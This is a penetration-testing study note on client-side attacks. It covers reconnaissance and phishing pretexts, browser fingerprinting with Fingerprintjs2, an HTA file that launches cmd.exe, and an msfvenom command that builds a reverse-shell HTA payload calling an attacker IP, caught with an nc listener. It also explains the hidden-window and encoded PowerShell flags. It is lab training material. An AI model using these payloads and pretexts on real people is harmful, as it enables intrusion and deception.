# Content

- [Content](#content)
  - [Know Your Target](#know-your-target)
    - [Passive Client Information Gathering](#passive-client-information-gathering)
    - [Active Client Information Gathering](#active-client-information-gathering)
    - [Social Engineering and Client-Side Attacks](#social-engineering-and-client-side-attacks)
    - [Client Fingerprinting](#client-fingerprinting)
      - [Demo](#demo)
  - [Leveraging HTML Applications](#leveraging-html-applications)
    - [Exploring HTML Applications](#exploring-html-applications)
      - [The way to work](#the-way-to-work)
      - [Demo](#demo-1)
    - [HTA Attack in Action](#hta-attack-in-action)
      - [Metasploit Framework](#metasploit-framework)
      - [The way to work](#the-way-to-work-1)
      - [Demo](#demo-2)

  
## Know Your Target

### Passive Client Information Gathering

- This paragraph describes how to use zero crawling techniques that directly interact with the target. In the example given, the attack team is tasked with attacking the employees of an enterprise with other client-side attack and phishing techniques. However, they are not allowed to communicate directly with the employees of the business.
- So the team Googled known corporate IP addresses and found an external IP address that was used to collect data from related websites. The information from this IP address provides information such as the version of the operating system, browser, and plugin installed on the user's computer. The team uses this information to determine the target's OS and browser version and then executes a client-side attack.
- The team modified an existing exploit and performed the test on a lab computer running the same operating system and browser as their target. The result was a success, so the team used this exploit to do a client-side attack on their target, and the end result was a reverse shell.
- The passage also shows that information about operating systems, application versions, antivirus applications and more can be gathered through various sources, including social sites and forums. Finding this information can make attack preparation easier.

### Active Client Information Gathering

- In contrast to non-interactive information gathering techniques, the technique of gathering information by direct interaction with the target computer or its user is called active information collection technique.
- This may include making a phone call to a user to gather useful information or sending a targeted email to a victim hoping to click a link to determine the operating system version, browser, or browser. browser and utilities installed on the victim's computer.

### Social Engineering and Client-Side Attacks

- This paragraph describes how to use social engineering techniques to increase the probability of successful client attacks, such as asking the target to click a link, open an email, or open an email. a document.
- In the example given, when wanting to attack the Human Resources department of a business, the attack group does not conduct the attack blindly. Instead, they designed an invalid "resume" document and designed it not to open. They send emails with engaging content for HR to respond to emails. Upon receiving a response email from HR, the attack team continued to interact with them, asking about the exact version of Microsoft Office they were using so that they could get the information needed to create a new exploit document.
- It is important that in pretexting, the attackers need to consider and select questions that do not raise suspicion. With the information gathered, the attackers can build a new exploit document containing a macro that uses PowerShell to exploit the computer and send the shell back to the attacker.
- However, the passage also suggests that social engineering techniques need to be more specific and complex, based on previously collected information to increase the likelihood of an attack's success.

### Client Fingerprinting

- Client Fingerprinting is the process of collecting information about a user's computer, including the operating system, web browser, and other components related to their versions and settings. This process may also include the collection of other information such as screen resolution, system language, and installed plugins. Information collected from Client Fingerprinting can be used to find security holes in a user's computer or to create customized human-targeted cyberattacks.
- For this example, we will use the Fingerprintjs2 JavaScript library:
  - Fingerprintjs2 can be used by hackers or attackers to illegally collect information that identifies the user's computer. 
  - However, this library can also be used by pentesters (who perform security testing) to detect and better understand browser obfuscation technologies, thereby helping them come up with solutions appropriate security. In addition, Fingerprintjs2 also has the ability to help prevent online user tracking techniques by detecting and preventing identifiers or other techniques used to collect user identifiers.

#### Demo

- First, we will download the Fingerprintjs2 library from the following link.
  `https://github.com/IanevskiAleksandr/fingerprintjs2.git`
  ![Picture](../13.%20Client-Side%20Attacks/Image/1.png)
- We will include the fingerprint2.js library from within the index.html HTML file located in the `/var/www/html/fp` directory of our Kali web server.
- After that, we will create a file index1.html that import the library fingerprint2.js and use it to collect information about the user's browser.
  ![Picture](../13.%20Client-Side%20Attacks/Image/2.png)
  
```html
<!doctype html>
<html>
<head>
<title>Fingerprintjs2 test</title>
</head>
<body>
 <h1>Fingerprintjs2</h1>
 <p>Your browser fingerprint: <strong id="fp"></strong></p>
 <p><code id="time"/></p>
 <p><span id="details"/></p>
 <script src="fingerprint2.js"></script>
 <script>
        var d1 = new Date();
        var options = {};
        Fingerprint2.get(options, function (components) {
          var values = components.map(function (component) { return component.value })
          var murmur = Fingerprint2.x64hash128(values.join(''), 31)
          var d2 = new Date();
          var timeString = "Time to calculate the fingerprint: " + (d2 - d1) + "ms";
          var details = "<strong>Detailed information: </strong><br />";
          if(typeof window.console !== "undefined") {
            for (var index in components) {
              var obj = components[index];
              var value = obj.value;
              if (value !== null) {
                var line = obj.key + " = " + value.toString().substr(0, 150);
                details += line + "<br />";
                }
            }
          }
          document.querySelector("#details").innerHTML = details 
          document.querySelector("#fp").textContent = murmur 
          document.querySelector("#time").textContent = timeString
        });
  </script>
</body>
</html>
```
- Now i try to access the index1.html file from the other browser (Win10) and see the result.
  ![Picture](../13.%20Client-Side%20Attacks/Image/3.png)

## Leveraging HTML Applications

- HTML Applications are a type of file with the extension .hta that can be executed directly from Internet Explorer using the mshta.exe program. This allows for arbitrary code execution outside of the security context of the browser, potentially giving an attacker access to the user's permissions. While this attack vector only works against Internet Explorer and Microsoft Edge, it can still be useful since many corporations rely on Internet Explorer as their main browser.

### Exploring HTML Applications

#### The way to work

- This paragraph is talking about client-side attack using HTML Applications (.hta). When a file is created with the extension .hta instead of .html, Internet Explorer automatically interprets it as an HTML Application and provides the ability to execute it using the mshta.exe program. This could allow an attacker to execute malicious code on the user's computer without their permission or control.
- If a file has a .html extension, the mshta.exe software will not be automatically activated to execute this file. Instead, the web browser will display the content of that HTML file in the browser window
- The mshta.exe software is an HTML executable built into the Windows operating system.
HTA (HTML Application) files are special HTML files that can contain JavaScript and VBScript code to create web-based applications on personal computers. When an HTA file is executed with the mshta.exe software on Windows, it will be displayed in an interface window like a regular desktop application.

#### Demo

- Mshta.exe located in C:\Windows\System32
  ![Picture](../13.%20Client-Side%20Attacks/Image/4.png)
- So we will creata a simple .hta file to run cmd.exe
  ![Picture](../13.%20Client-Side%20Attacks/Image/5.png)
```html
<html>
<body>
<script>
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
  - Your JavaScript code uses the ActiveXObject object to create a COM object called WScript.Shell. This WScript.Shell object helps you interact with the Command Prompt application on your computer.
  - When you call the Run() method of this WScript.Shell object with the string "cmd.exe" as parameter, it launches the Command Prompt application and allows you to execute commands on the Command Prompt command line interface.
  - In the Windows environment, applications developed using different programming languages and using different libraries and components may not be compatible with each other. To solve this problem, Microsoft has introduced COM - a standard communication mechanism for applications in the Windows system.
  - With COM, applications can interact with each other through COM interfaces, even if they are written in different programming languages or use different libraries and components. Using COM makes it possible for applications to securely and efficiently share resources and data.

- When i download it and run it, it will open cmd.exe
  ![Picture](../13.%20Client-Side%20Attacks/Image/6.png)
  ![Picture](../13.%20Client-Side%20Attacks/Image/7.png)
  ![Picture](../13.%20Client-Side%20Attacks/Image/8.png)

### HTA Attack in Action

#### Metasploit Framework

- Metasploit Framework is a penetration testing platform used in attacks and security testing. It allows the user to find security holes in the target system, create malicious payloads to exploit these vulnerabilities, and perform intrusive actions such as remote control of the victim's computer or Stealing important information.
- The working mechanism of Metasploit Framework includes the following steps:
  - Vulnerability scanning: The user searches for security holes in the target system using network scanning tools (eg Nmap) or Metasploit modules.
  - Generate payload: After finding a vulnerability, users use msfvenom to generate malicious payloads that match their goals.
  - Vulnerability Exploitation: The payload is deployed to the target system to remotely control the victim's computer or steal important information.
  - Control and control: Users use Metasploit modules to control and control the target system, including erasing traces of their activities on the system.
- Metasploit Framework modules used for vulnerability scanning include:
  - Auxiliary modules: These are modules that assist in scanning the network and gathering information about the target system. For example auxiliary/scanner/tcp, auxiliary/scanner/http, auxiliary/scanner/ssh and many others.
  - Exploit modules: Exploit modules are used to attack the discovered vulnerabilities. For example exploit/windows/smb/ms17_010_eternalblue, exploit/multi/http/jboss_maindeployer, exploit/multi/misc/java_rmi_server and many other modules.
  - Payload modules: Payload modules are modules used to generate malicious payloads for intrusion attacks. For example payload/windows/meterpreter/reverse_tcp, payload/linux/x86/shell_reverse_tcp, payload/windows/shell/reverse_tcp and many more modules.
  - Post modules: Post modules are used after a successful attack on a target system. They are used for information gathering, remote control, and other intrusive actions. For example post/windows/gather/hashdump, post/multi/recon/local_exploit_suggester, post/windows/manage/migrate and many others.
  
#### The way to work

- Metasploit Framework is a penetration testing platform used to develop and deploy security testing tools. Among them is the msfvenom tool which is used to create custom payloads to attack target systems. It allows users to create malicious executables or shells using vulnerabilities in the target system and contains commands to perform intrusive actions.

#### Demo

- First, we will create a malicious payload using the msfvenom tool. This payload will be used to attack the target system.
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.156 LPORT=4444 -f hta-psh -o /var/www/html/fp/evil.hta
```
  - -p windows/shell_reverse_tcp: select payload as shell_reverse_tcp which allows attacker to establish reverse shell connection with infected machine.
  - LHOST=192.168.50.156: determine the attacker's IP address
  - LPORT=4444: Determines the listening port of the attacker to connect to the reverse shell set up on the infected machine.
  - -f hta-psh: output file format is HTA-Powershell, an HTML file type containing Powershell code to execute the payload.
  - -o /var/www/html/fp/evil.hta: save the output file to the directory /var/www/html/upload/ with the file name evil.hta
  ![Picture](../13.%20Client-Side%20Attacks/Image/9.png)
- We will generate the payload to see something.
  ![Picture](../13.%20Client-Side%20Attacks/Image/10.png)
- Some options we can notice:
  - The first parameter, -nop (short for -NoProfile), instructs PowerShell not to load the PowerShell user profile. This option will avoid any potential problems that may arise from loading existing user profile scripts.
  - The second parameter, -w hidden (short for -WindowStyle hidden), avoids creating a window on the user's desktop. This ensures that the user does not see any suspicious windows or pop-ups.
  - Finally, the -e flag (short for -EncodedCommand) allows us to provide a Base64-encoded PowerShell script directly as a command line argument. This ensures that the PowerShell script is not easily read by anyone who can intercept the command.
- Now if we download it and run.
  ![Picture](../13.%20Client-Side%20Attacks/Image/11.png)
  ![Picture](../13.%20Client-Side%20Attacks/Image/12.png)
  - In windows, we must turn off the firewall 
  ![Picture](../13.%20Client-Side%20Attacks/Image/13.png)
- In kali, we just use command and we have a reverse shell to control the target machine. 
```
nc -nlvp 4444
```
  ![Picture](../13.%20Client-Side%20Attacks/Image/14.png) 
